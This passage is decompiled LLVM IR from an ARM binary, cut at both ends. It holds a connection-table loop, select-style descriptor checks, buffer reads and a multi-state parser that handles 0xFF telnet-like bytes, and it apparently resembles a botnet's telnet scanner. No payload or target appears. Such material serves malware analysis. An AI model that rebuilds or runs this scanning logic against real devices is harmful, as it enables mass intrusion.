  %v0_114ec = load i32, i32* @r6, align 4
  %v1_114ec = load i32, i32* @r5, align 4
  %v3_114ec = icmp uge i32 %v0_114ec, %v1_114ec
  store i1 %v3_114ec, i1* %cpsr_c.global-to-local, align 1
  %v9_114ec = icmp eq i32 %v0_114ec, %v1_114ec
  store i1 %v9_114ec, i1* %cpsr_z.global-to-local, align 1
  %v5_114f0 = icmp slt i32 %v0_114ec, %v1_114ec
  %storemerge75 = select i1 %v5_114f0, i32 %v1_114ec, i32 %v0_114ec
  %v2_11504 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_11504, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1150c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_1150c, i32* %ip.global-to-local, align 4
  %v2_11510 = ptrtoint i32* %stack_var_-220 to i32
  store i32 %v2_11510, i32* %r1.global-to-local, align 4
  %v1_11514 = add i32 %storemerge75, 1
  store i32 %v1_11514, i32* %r0.global-to-local, align 4
  %v5_11520 = call i32 @function_13874(i32 %v1_11514, i32 %v2_11510, i32 %v2_11504, i32 0, i32 %v2_1150c)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_11528 = call i32 @function_13924(i32* null)
  store i32 ptrtoint (i32* @global_var_1ec34.185 to i32), i32* %lr.global-to-local, align 4
  store i32 %v2_11528, i32* @global_var_1ec34.185, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v2_116f0 = inttoptr i32 %stack_var_-1868.0 to i32*
  %v2_11798 = ptrtoint i32* %stack_var_-41 to i32
  %v2_11f84 = ptrtoint i32* %stack_var_-84 to i32
  %v2_11f8c = ptrtoint i32* %stack_var_-73 to i32
  %v2_11b00 = ptrtoint i32* %stack_var_-56 to i32
  %v2_11bb4 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_1157c

dec_label_pc_11544:                               ; preds = %dec_label_pc_115a0, %dec_label_pc_12110
  %v0_11558 = phi i32 [ %v3_11594, %dec_label_pc_115a0 ], [ %v0_11544.pre, %dec_label_pc_12110 ]
  %v3_11544 = udiv i32 %v0_11558, 32
  %v3_11548 = mul nuw nsw i32 %v3_11544, 4
  store i32 %v2_11480, i32* @lr, align 4
  %v2_11550 = add i32 %v3_11548, %v2_11480
  store i32 %v2_11550, i32* %r3.global-to-local, align 4
  %v1_11554 = add i32 %v2_11550, -184
  %v2_11554 = inttoptr i32 %v1_11554 to i32*
  %v3_11554 = load i32, i32* %v2_11554, align 4
  %v1_11558 = urem i32 %v0_11558, 32
  store i32 %v1_11558, i32* %r1.global-to-local, align 4
  %v2_1155c = add nsw i32 %v1_11558, -1
  %v3_1155c = shl i32 1, %v2_1155c
  %v4_1155c = and i32 %v3_1155c, %v3_11554
  %v5_1155c = icmp ne i32 %v4_1155c, 0
  store i1 %v5_1155c, i1* %cpsr_c.global-to-local, align 1
  %v6_1155c = lshr i32 %v3_11554, %v1_11558
  store i32 %v6_1155c, i32* %r2.global-to-local, align 4
  %v1_11560 = urem i32 %v6_1155c, 2
  %v2_11560 = icmp eq i32 %v1_11560, 0
  store i1 %v2_11560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11560, label %dec_label_pc_11568, label %dec_label_pc_116cc.preheader

dec_label_pc_116cc.preheader:                     ; preds = %dec_label_pc_11544
  %v0_116cc101 = load i32, i32* @r5, align 4
  %v1_116cc102 = add i32 %v0_116cc101, 12
  %v2_116cc103 = inttoptr i32 %v1_116cc102 to i32*
  %v3_116cc104 = load i32, i32* %v2_116cc103, align 4
  store i32 %v3_116cc104, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116d0100106 = icmp eq i32 %v3_116cc104, 0
  store i1 %v2_116d0100106, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116d0100106, label %dec_label_pc_11568, label %dec_label_pc_116d8.lr.ph

dec_label_pc_11568:                               ; preds = %dec_label_pc_116cc.loopexit, %dec_label_pc_116cc.preheader, %dec_label_pc_11544, %bb344, %dec_label_pc_1202c, %dec_label_pc_1157c, %dec_label_pc_12124, %dec_label_pc_12070
  %v3_11568 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_11568, i32* %r3.global-to-local, align 4
  %v1_1156c = add i32 %v3_11568, 1
  store i32 %v1_1156c, i32* %r2.global-to-local, align 4
  %v2_11570 = icmp ugt i32 %v1_1156c, 126
  store i1 %v2_11570, i1* %cpsr_c.global-to-local, align 1
  %v7_11570 = icmp eq i32 %v1_1156c, 127
  store i1 %v7_11570, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_1156c, i32* %stack_var_-52, align 4
  %v8_11578 = icmp sgt i32 %v1_1156c, 127
  br i1 %v8_11578, label %dec_label_pc_10f10, label %dec_label_pc_1157c

dec_label_pc_1157c:                               ; preds = %dec_label_pc_11568, %dec_label_pc_114e4
  %v0_11588 = phi i32 [ %v1_1156c, %dec_label_pc_11568 ], [ 0, %dec_label_pc_114e4 ]
  store i32 ptrtoint (i32* @global_var_1ec98.197 to i32), i32* %ip.global-to-local, align 4
  %v3_11580 = mul i32 %v0_11588, 256
  store i32 %v3_11580, i32* %r3.global-to-local, align 4
  %v2_11584 = load i32, i32* @global_var_1ec98.197, align 4
  store i32 %v2_11584, i32* %r1.global-to-local, align 4
  %v2_1158c = mul i32 %v0_11588, 288
  store i32 %v2_1158c, i32* %r2.global-to-local, align 4
  %v2_11590 = add i32 %v2_11584, %v2_1158c
  store i32 %v2_11590, i32* @r5, align 4
  %v1_11594 = add i32 %v2_11590, 4
  %v2_11594 = inttoptr i32 %v1_11594 to i32*
  %v3_11594 = load i32, i32* %v2_11594, align 4
  store i32 %v3_11594, i32* @r4, align 4
  %v2_11598 = icmp eq i32 %v3_11594, -1
  store i1 %v2_11598, i1* %cpsr_c.global-to-local, align 1
  %v7_11598 = icmp eq i32 %v3_11594, -1
  store i1 %v7_11598, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11598, label %dec_label_pc_11568, label %dec_label_pc_115a0

dec_label_pc_115a0:                               ; preds = %dec_label_pc_1157c
  %v3_115a0 = udiv i32 %v3_11594, 32
  %v3_115a4 = mul nuw nsw i32 %v3_115a0, 4
  store i32 %v2_11480, i32* %lr.global-to-local, align 4
  %v2_115ac = add i32 %v3_115a4, %v2_11480
  store i32 %v2_115ac, i32* %r3.global-to-local, align 4
  %v1_115b0 = add i32 %v2_115ac, -312
  %v2_115b0 = inttoptr i32 %v1_115b0 to i32*
  %v3_115b0 = load i32, i32* %v2_115b0, align 4
  %v1_115b4 = urem i32 %v3_11594, 32
  store i32 %v1_115b4, i32* %r1.global-to-local, align 4
  %v2_115b8 = add nsw i32 %v1_115b4, -1
  %v3_115b8 = shl i32 1, %v2_115b8
  %v4_115b8 = and i32 %v3_115b0, %v3_115b8
  %v5_115b8 = icmp ne i32 %v4_115b8, 0
  store i1 %v5_115b8, i1* %cpsr_c.global-to-local, align 1
  %v6_115b8 = lshr i32 %v3_115b0, %v1_115b4
  store i32 %v6_115b8, i32* %r2.global-to-local, align 4
  %v1_115bc = urem i32 %v6_115b8, 2
  %v2_115bc = icmp eq i32 %v1_115bc, 0
  store i1 %v2_115bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_115bc, label %dec_label_pc_11544, label %dec_label_pc_115c4

dec_label_pc_115c4:                               ; preds = %dec_label_pc_115a0
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  store i32 %v2_11bb4, i32* %r3.global-to-local, align 4
  store i32 %v2_11b00, i32* %ip.global-to-local, align 4
  store i32 %v3_11594, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %v6_115f4 = call i32 @function_13e04(i32 %v3_11594, i32 1, i32 4, i32* nonnull %stack_var_-48, i32 %v2_11b00)
  %v3_115f8 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_115f8, i32* %r3.global-to-local, align 4
  %v2_115fc = or i32 %v3_115f8, %v6_115f4
  store i32 %v2_115fc, i32* %r0.global-to-local, align 4
  %v4_115fc = icmp eq i32 %v2_115fc, 0
  store i1 %v4_115fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_115fc, label %dec_label_pc_11604, label %dec_label_pc_12124

dec_label_pc_11604:                               ; preds = %dec_label_pc_115c4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_11608 = load i32, i32* @r5, align 4
  %v2_11608 = add i32 %v1_11608, 12
  %v3_11608 = inttoptr i32 %v2_11608 to i32*
  store i32 2, i32* %v3_11608, align 4
  %v0_1160c = call i32 @function_fe60()
  store i32 %v0_1160c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1ec30.191 to i32), i32* %r3.global-to-local, align 4
  %v3_11614 = load i8, i8* @global_var_1ec31.192, align 1
  %v4_11614 = zext i8 %v3_11614 to i32
  store i32 %v4_11614, i32* %r2.global-to-local, align 4
  %v2_11618 = load i8, i8* bitcast (i8** @global_var_1ec30.191 to i8*), align 4
  %v3_11618 = zext i8 %v2_11618 to i32
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_1161c = mul nuw nsw i32 %v4_11614, 256
  %v5_1161c = or i32 %v3_11618, %v4_1161c
  store i32 %v5_1161c, i32* %r1.global-to-local, align 4
  %v2_11620 = call i32 @function_133b0(i32 %v0_1160c, i32 %v5_1161c)
  store i32 ptrtoint (i32* @global_var_1ec00.187 to i32), i32* %r3.global-to-local, align 4
  %v2_11628 = load i32, i32* @global_var_1ec00.187, align 4
  store i32 %v2_11628, i32* %lr.global-to-local, align 4
  %v1_11630 = load i32, i32* @r6, align 4
  %v9_11630 = icmp eq i32 %v2_11628, %v1_11630
  store i1 %v9_11630, i1* %cpsr_z.global-to-local, align 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_11634 = urem i32 %v2_11620, 65536
  store i32 %v3_11634, i32* %r0.global-to-local, align 4
  %v7_11638 = icmp sgt i32 %v2_11628, %v1_11630
  br i1 %v7_11638, label %dec_label_pc_1163c, label %dec_label_pc_1210c

dec_label_pc_1163c:                               ; preds = %dec_label_pc_11604
  %v2_11640 = load i32, i32* @global_var_1ec2c.189, align 4
  store i32 %v2_11640, i32* %r3.global-to-local, align 4
  store i32 %v1_11630, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1165c

dec_label_pc_1164c:                               ; preds = %dec_label_pc_11674, %dec_label_pc_1165c
  %v1_1164c = add i32 %v0_1164c, 1
  store i32 %v1_1164c, i32* %ip.global-to-local, align 4
  %v3_11650 = icmp uge i32 %v1_1164c, %v2_11628
  store i1 %v3_11650, i1* %cpsr_c.global-to-local, align 1
  %v9_11650 = icmp eq i32 %v1_1164c, %v2_11628
  store i1 %v9_11650, i1* %cpsr_z.global-to-local, align 1
  %v1_11654 = add i32 %v0_11654, 16
  store i32 %v1_11654, i32* %r3.global-to-local, align 4
  br i1 %v9_11650, label %dec_label_pc_1210c, label %dec_label_pc_1165c

dec_label_pc_1165c:                               ; preds = %dec_label_pc_1164c, %dec_label_pc_1163c
  %v0_1164c = phi i32 [ %v1_1164c, %dec_label_pc_1164c ], [ %v1_11630, %dec_label_pc_1163c ]
  %v0_11654 = phi i32 [ %v1_11654, %dec_label_pc_1164c ], [ %v2_11640, %dec_label_pc_1163c ]
  store i32 %v0_11654, i32* %r1.global-to-local, align 4
  %v1_11660 = add i32 %v0_11654, 9
  %v2_11660 = inttoptr i32 %v1_11660 to i8*
  %v3_11660 = load i8, i8* %v2_11660, align 1
  %v4_11660 = zext i8 %v3_11660 to i32
  store i32 %v4_11660, i32* %r2.global-to-local, align 4
  %v1_11664 = add i32 %v0_11654, 8
  %v2_11664 = inttoptr i32 %v1_11664 to i8*
  %v3_11664 = load i8, i8* %v2_11664, align 1
  %v4_11664 = zext i8 %v3_11664 to i32
  %v4_11668 = mul nuw nsw i32 %v4_11660, 256
  %v5_11668 = or i32 %v4_11664, %v4_11668
  store i32 %v5_11668, i32* %r3.global-to-local, align 4
  %v3_1166c = icmp uge i32 %v5_11668, %v3_11634
  store i1 %v3_1166c, i1* %cpsr_c.global-to-local, align 1
  %v9_1166c = icmp eq i32 %v5_11668, %v3_11634
  store i1 %v9_1166c, i1* %cpsr_z.global-to-local, align 1
  %v2_11670 = xor i1 %v9_1166c, true
  %v3_11670 = and i1 %v3_1166c, %v2_11670
  br i1 %v3_11670, label %dec_label_pc_1164c, label %dec_label_pc_11674

dec_label_pc_11674:                               ; preds = %dec_label_pc_1165c
  %v1_11674 = add i32 %v0_11654, 10
  %v2_11674 = inttoptr i32 %v1_11674 to i8*
  %v3_11674 = load i8, i8* %v2_11674, align 1
  %v4_11674 = zext i8 %v3_11674 to i32
  store i32 %v4_11674, i32* %r3.global-to-local, align 4
  %v1_11678 = add i32 %v0_11654, 11
  %v2_11678 = inttoptr i32 %v1_11678 to i8*
  %v3_11678 = load i8, i8* %v2_11678, align 1
  %v4_11678 = zext i8 %v3_11678 to i32
  store i32 %v4_11678, i32* %r2.global-to-local, align 4
  %v4_1167c = mul nuw nsw i32 %v4_11678, 256
  %v5_1167c = or i32 %v4_1167c, %v4_11674
  store i32 %v5_1167c, i32* %r3.global-to-local, align 4
  %v3_11680 = icmp uge i32 %v5_1167c, %v3_11634
  store i1 %v3_11680, i1* %cpsr_c.global-to-local, align 1
  %v9_11680 = icmp eq i32 %v5_1167c, %v3_11634
  store i1 %v9_11680, i1* %cpsr_z.global-to-local, align 1
  %v2_11684 = xor i1 %v3_11680, true
  %v3_11684 = or i1 %v9_11680, %v2_11684
  br i1 %v3_11684, label %dec_label_pc_1164c, label %dec_label_pc_12110

dec_label_pc_1168c:                               ; preds = %dec_label_pc_1189c, %dec_label_pc_11870, %dec_label_pc_118b8
  store i32 %v3_11870, i32* %r1.global-to-local, align 4
  %v0_11690 = load i32, i32* @sb, align 4
  store i32 %v0_11690, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1614c.324 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v5_1169c = call i32 @function_12d58(i32 %v0_11690, i32 %v3_11870, i32 ptrtoint ([5 x i8]* @global_var_1614c.324 to i32), i32 4)
  store i32 %v5_1169c, i32* %r0.global-to-local, align 4
  %v3_116a0 = icmp eq i32 %v5_1169c, -1
  store i1 %v3_116a0, i1* %cpsr_c.global-to-local, align 1
  %v8_116a0 = icmp eq i32 %v5_1169c, -1
  store i1 %v8_116a0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_1169c, i32* @r7, align 4
  br i1 %v3_116a0, label %dec_label_pc_116ac, label %dec_label_pc_118c4

dec_label_pc_116ac:                               ; preds = %dec_label_pc_1168c
  %v0_116ac = load i32, i32* @sb, align 4
  store i32 %v0_116ac, i32* %r0.global-to-local, align 4
  %v0_116b0 = load i32, i32* @r5, align 4
  %v1_116b0 = add i32 %v0_116b0, 24
  %v2_116b0 = inttoptr i32 %v1_116b0 to i32*
  %v3_116b0 = load i32, i32* %v2_116b0, align 4
  store i32 %v3_116b0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_16154.326 to i32), i32* %r2.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v5_116bc = call i32 @function_12d58(i32 %v0_116ac, i32 %v3_116b0, i32 ptrtoint ([6 x i8]* @global_var_16154.326 to i32), i32 5)
  store i32 %v5_116bc, i32* %r0.global-to-local, align 4
  %v3_116c0 = icmp eq i32 %v5_116bc, -1
  store i1 %v3_116c0, i1* %cpsr_c.global-to-local, align 1
  %v8_116c0 = icmp eq i32 %v5_116bc, -1
  store i1 %v8_116c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_116bc, i32* @r7, align 4
  br i1 %v3_116c0, label %dec_label_pc_116cc.loopexit, label %dec_label_pc_118c4

dec_label_pc_116cc.loopexit:                      ; preds = %dec_label_pc_11860, %dec_label_pc_11da0, %dec_label_pc_11750, %dec_label_pc_116ac, %dec_label_pc_1207c
  %v0_116cc = load i32, i32* @r5, align 4
  %v1_116cc = add i32 %v0_116cc, 12
  %v2_116cc = inttoptr i32 %v1_116cc to i32*
  %v3_116cc = load i32, i32* %v2_116cc, align 4
  store i32 %v3_116cc, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_116d0100 = icmp eq i32 %v3_116cc, 0
  store i1 %v2_116d0100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116d0100, label %dec_label_pc_11568, label %dec_label_pc_116d8.lr.ph

dec_label_pc_116d8.lr.ph:                         ; preds = %dec_label_pc_116cc.preheader, %dec_label_pc_116cc.loopexit
  %v0_116d8132 = phi i32 [ %v0_116cc, %dec_label_pc_116cc.loopexit ], [ %v0_116cc101, %dec_label_pc_116cc.preheader ]
  br label %dec_label_pc_116d8

dec_label_pc_116d0thread-pre-split.thread:        ; preds = %dec_label_pc_11a98, %dec_label_pc_11b4c, %dec_label_pc_11c00, %dec_label_pc_11cb4, %dec_label_pc_11ec0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116d8

dec_label_pc_116d0thread-pre-split:               ; preds = %dec_label_pc_11ae0, %dec_label_pc_11b94, %dec_label_pc_11c48, %dec_label_pc_11cfc, %dec_label_pc_11f08, %dec_label_pc_11eec, %dec_label_pc_11c2c, %dec_label_pc_11ce0, %dec_label_pc_11b78, %dec_label_pc_11ac4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116d8

dec_label_pc_116d8:                               ; preds = %dec_label_pc_116d0thread-pre-split.thread, %dec_label_pc_116d0thread-pre-split, %dec_label_pc_116d8.lr.ph
  %v0_120c8 = phi i32 [ %v0_116d8132, %dec_label_pc_116d8.lr.ph ], [ %v0_11750, %dec_label_pc_116d0thread-pre-split ], [ %v0_11750, %dec_label_pc_116d0thread-pre-split.thread ]
  %v1_116d8 = add i32 %v0_120c8, 24
  %v2_116d8 = inttoptr i32 %v1_116d8 to i32*
  %v3_116d8 = load i32, i32* %v2_116d8, align 4
  store i32 %v3_116d8, i32* %r3.global-to-local, align 4
  %v2_116dc = icmp ugt i32 %v3_116d8, 255
  store i1 %v2_116dc, i1* %cpsr_c.global-to-local, align 1
  %v7_116dc = icmp eq i32 %v3_116d8, 256
  store i1 %v7_116dc, i1* %cpsr_z.global-to-local, align 1
  %.pre = add i32 %v0_120c8, 28
  store i32 %.pre, i32* @sb, align 4
  br i1 %v7_116dc, label %dec_label_pc_120c8, label %dec_label_pc_116e8

dec_label_pc_116e8:                               ; preds = %dec_label_pc_116d8, %dec_label_pc_120c8
  store i32 %stack_var_-1868.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %v2_116f0, align 4
  %v0_116f4 = load i32, i32* @r5, align 4
  %v1_116f4 = add i32 %v0_116f4, 24
  %v2_116f4 = inttoptr i32 %v1_116f4 to i32*
  %v3_116f4 = load i32, i32* %v2_116f4, align 4
  store i32 %v3_116f4, i32* %r2.global-to-local, align 4
  %v0_116f8 = load i32, i32* @sb, align 4
  %v2_116f8 = add i32 %v0_116f8, %v3_116f4
  store i32 %v2_116f8, i32* @r4, align 4
  %v1_116fc = add i32 %v0_116f4, 4
  %v2_116fc = inttoptr i32 %v1_116fc to i32*
  %v3_116fc = load i32, i32* %v2_116fc, align 4
  store i32 %v3_116fc, i32* %r0.global-to-local, align 4
  %v1_11700 = sub i32 256, %v3_116f4
  store i32 %v1_11700, i32* %r2.global-to-local, align 4
  store i32 %v2_116f8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_1170c = inttoptr i32 %v2_116f8 to i32*
  %v5_1170c = call i32 @function_13e60(i32 %v3_116fc, i32* %v4_1170c, i32 %v1_11700, i32 16384)
  store i32 %v5_1170c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11710 = icmp eq i32 %v5_1170c, 0
  store i1 %v2_11710, i1* %cpsr_z.global-to-local, align 1
  %tmp310 = icmp slt i32 %v5_1170c, 1
  br i1 %tmp310, label %dec_label_pc_12020, label %dec_label_pc_11718

dec_label_pc_11718:                               ; preds = %dec_label_pc_116e8
  %v0_11718 = load i32, i32* @r6, align 4
  store i32 %v0_11718, i32* %r2.global-to-local, align 4
  store i32 65, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11720

dec_label_pc_11720:                               ; preds = %bb312, %dec_label_pc_11718
  %v3_11728 = phi i32 [ %v1_1172c, %bb312 ], [ %v0_11718, %dec_label_pc_11718 ]
  %v1_11720 = load i32, i32* @r4, align 4
  %v2_11720 = add i32 %v1_11720, %v3_11728
  %v3_11720 = inttoptr i32 %v2_11720 to i8*
  %v4_11720 = load i8, i8* %v3_11720, align 1
  %v6_11720 = zext i8 %v4_11720 to i32
  store i32 %v6_11720, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_11724 = icmp eq i8 %v4_11720, 0
  store i1 %v2_11724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11724, label %bb311, label %bb312

bb311:                                            ; preds = %dec_label_pc_11720
  %v1_11728 = load i32, i32* %r1.global-to-local, align 4
  %v2_11728 = trunc i32 %v1_11728 to i8
  store i8 %v2_11728, i8* %v3_11720, align 1
  %v0_1172c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb312

bb312:                                            ; preds = %dec_label_pc_11720, %bb311
  %v0_1172c = phi i32 [ %v3_11728, %dec_label_pc_11720 ], [ %v0_1172c.pre, %bb311 ]
  %v1_1172c = add i32 %v0_1172c, 1
  store i32 %v1_1172c, i32* %r2.global-to-local, align 4
  %v3_11730 = icmp uge i32 %v5_1170c, %v1_1172c
  store i1 %v3_11730, i1* %cpsr_c.global-to-local, align 1
  %v9_11730 = icmp eq i32 %v5_1170c, %v1_1172c
  store i1 %v9_11730, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_11730, label %dec_label_pc_11738, label %dec_label_pc_11720

dec_label_pc_11738:                               ; preds = %bb312, %dec_label_pc_12024
  store i32 ptrtoint (i32* @global_var_1ec34.185 to i32), i32* @lr, align 4
  %v0_1173c = load i32, i32* @r5, align 4
  %v1_1173c = add i32 %v0_1173c, 24
  %v2_1173c = inttoptr i32 %v1_1173c to i32*
  %v3_1173c = load i32, i32* %v2_1173c, align 4
  %v2_11740 = load i32, i32* @global_var_1ec34.185, align 4
  store i32 %v2_11740, i32* %r3.global-to-local, align 4
  %v2_11744 = add i32 %v3_1173c, %v5_1170c
  store i32 %v2_11744, i32* %ip.global-to-local, align 4
  store i32 %v2_11744, i32* %v2_1173c, align 4
  %v0_1174c = load i32, i32* %r3.global-to-local, align 4
  %v1_1174c = load i32, i32* @r5, align 4
  %v2_1174c = add i32 %v1_1174c, 8
  %v3_1174c = inttoptr i32 %v2_1174c to i32*
  store i32 %v0_1174c, i32* %v3_1174c, align 4
  br label %dec_label_pc_11750

dec_label_pc_11750:                               ; preds = %dec_label_pc_11e9c, %dec_label_pc_11738
  %v0_11750 = load i32, i32* @r5, align 4
  %v1_11750 = add i32 %v0_11750, 12
  %v2_11750 = inttoptr i32 %v1_11750 to i32*
  %v3_11750 = load i32, i32* %v2_11750, align 4
  store i32 %v3_11750, i32* %r2.global-to-local, align 4
  %v1_11754 = add i32 %v3_11750, -2
  store i32 %v1_11754, i32* %r3.global-to-local, align 4
  %v7_11758 = icmp eq i32 %v1_11754, 8
  store i1 %v7_11758, i1* %cpsr_z.global-to-local, align 1
  %v5_1175c = and i32 %v1_11754, 1073741824
  %v6_1175c = icmp ne i32 %v5_1175c, 0
  store i1 %v6_1175c, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v3_11750, label %dec_label_pc_116cc.loopexit [
    i32 2, label %dec_label_pc_11788
    i32 3, label %dec_label_pc_11870
    i32 4, label %dec_label_pc_11a08
    i32 5, label %dec_label_pc_11a98
    i32 6, label %dec_label_pc_11b4c
    i32 7, label %dec_label_pc_11cb4
    i32 8, label %dec_label_pc_11c00
    i32 9, label %dec_label_pc_11ec0
    i32 10, label %dec_label_pc_11d68
  ]

dec_label_pc_11788:                               ; preds = %dec_label_pc_11750
  %v1_1178c = add i32 %v0_11750, 24
  %v2_1178c = inttoptr i32 %v1_1178c to i32*
  %v3_1178c = load i32, i32* %v2_1178c, align 4
  store i32 %v3_1178c, i32* %ip.global-to-local, align 4
  %v0_11790 = load i32, i32* @sb, align 4
  store i32 %v0_11790, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  %v1_1179c = add i32 %v0_11750, 29
  store i32 %v1_1179c, i32* @r4, align 4
  store i32 -3, i32* %sl.global-to-local, align 4
  store i32 -4, i32* @r8, align 4
  %v3_117a891 = icmp eq i32 %v3_1178c, 0
  store i1 %v3_117a891, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_117a891, i1* %cpsr_z.global-to-local, align 1
  %v6_117ac98 = icmp sgt i32 %v3_1178c, 0
  br i1 %v6_117ac98, label %dec_label_pc_117b0.preheader, label %dec_label_pc_11850

dec_label_pc_117a8.loopexit:                      ; preds = %dec_label_pc_117c8
  %v2_117d0 = add i32 %v1_117d0, 2
  store i32 %v2_117d0, i32* @r6, align 4
  %v2_117d4 = add i32 %v1_117d4, 2
  store i32 %v2_117d4, i32* @r4, align 4
  %v2_117d8 = add i32 %v1_117d8, 2
  store i32 %v2_117d8, i32* @r7, align 4
  %v3_117a8 = icmp uge i32 %v2_117d8, %v1_117a8
  store i1 %v3_117a8, i1* %cpsr_c.global-to-local, align 1
  %v9_117a8 = icmp eq i32 %v2_117d8, %v1_117a8
  store i1 %v9_117a8, i1* %cpsr_z.global-to-local, align 1
  %v6_117ac = icmp slt i32 %v2_117d8, %v1_117a8
  br i1 %v6_117ac, label %dec_label_pc_117b0.preheader, label %dec_label_pc_11850

dec_label_pc_117b0.preheader:                     ; preds = %dec_label_pc_11788, %dec_label_pc_117a8.loopexit
  %v6_11858168 = phi i32 [ %v6_11858169, %dec_label_pc_117a8.loopexit ], [ %v0_11750, %dec_label_pc_11788 ]
  %v1_117d8157 = phi i32 [ %v2_117d8, %dec_label_pc_117a8.loopexit ], [ 0, %dec_label_pc_11788 ]
  %v1_117d0155 = phi i32 [ %v2_117d0, %dec_label_pc_117a8.loopexit ], [ %v0_11790, %dec_label_pc_11788 ]
  %v1_117bc153 = phi i32 [ %v1_117a8, %dec_label_pc_117a8.loopexit ], [ %v3_1178c, %dec_label_pc_11788 ]
  %v0_117b0151 = phi i32 [ %v2_117d4, %dec_label_pc_117a8.loopexit ], [ %v1_1179c, %dec_label_pc_11788 ]
  br label %dec_label_pc_117b0

dec_label_pc_117b0:                               ; preds = %dec_label_pc_117b0.preheader, %dec_label_pc_11830
  %v6_11858169 = phi i32 [ %v6_11858168, %dec_label_pc_117b0.preheader ], [ %v0_11838, %dec_label_pc_11830 ]
  %v1_117d8 = phi i32 [ %v1_117d8157, %dec_label_pc_117b0.preheader ], [ %v1_1183c, %dec_label_pc_11830 ]
  %v1_117d0 = phi i32 [ %v1_117d0155, %dec_label_pc_117b0.preheader ], [ %v1_11844, %dec_label_pc_11830 ]
  %v1_117a8 = phi i32 [ %v1_117bc153, %dec_label_pc_117b0.preheader ], [ %v3_11838, %dec_label_pc_11830 ]
  %v1_117d4 = phi i32 [ %v0_117b0151, %dec_label_pc_117b0.preheader ], [ %v1_11848, %dec_label_pc_11830 ]
  %v1_117b0 = add i32 %v1_117d4, -1
  %v2_117b0 = inttoptr i32 %v1_117b0 to i8*
  %v3_117b0 = load i8, i8* %v2_117b0, align 1
  %v4_117b0 = zext i8 %v3_117b0 to i32
  store i32 %v4_117b0, i32* %r3.global-to-local, align 4
  %v2_117b4 = icmp eq i8 %v3_117b0, -1
  store i1 %v2_117b4, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_117b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117b4, label %dec_label_pc_117bc, label %dec_label_pc_11850

dec_label_pc_117bc:                               ; preds = %dec_label_pc_117b0
  %v0_117bc = load i32, i32* @sb, align 4
  %v2_117bc = add i32 %v0_117bc, %v1_117a8
  store i32 %v2_117bc, i32* %r2.global-to-local, align 4
  %v3_117c0 = icmp uge i32 %v2_117bc, %v1_117d4
  store i1 %v3_117c0, i1* %cpsr_c.global-to-local, align 1
  %v9_117c0 = icmp eq i32 %v2_117bc, %v1_117d4
  store i1 %v9_117c0, i1* %cpsr_z.global-to-local, align 1
  %v2_117c4 = xor i1 %v3_117c0, true
  %v3_117c4 = or i1 %v9_117c0, %v2_117c4
  br i1 %v3_117c4, label %dec_label_pc_11850, label %dec_label_pc_117c8

dec_label_pc_117c8:                               ; preds = %dec_label_pc_117bc
  %v1_117c8 = inttoptr i32 %v1_117d4 to i8*
  %v2_117c8 = load i8, i8* %v1_117c8, align 1
  %v3_117c8 = zext i8 %v2_117c8 to i32
  store i32 %v3_117c8, i32* %r3.global-to-local, align 4
  %v2_117cc = icmp eq i8 %v2_117c8, -1
  store i1 %v2_117cc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_117cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_117cc, label %dec_label_pc_117a8.loopexit, label %dec_label_pc_117e0

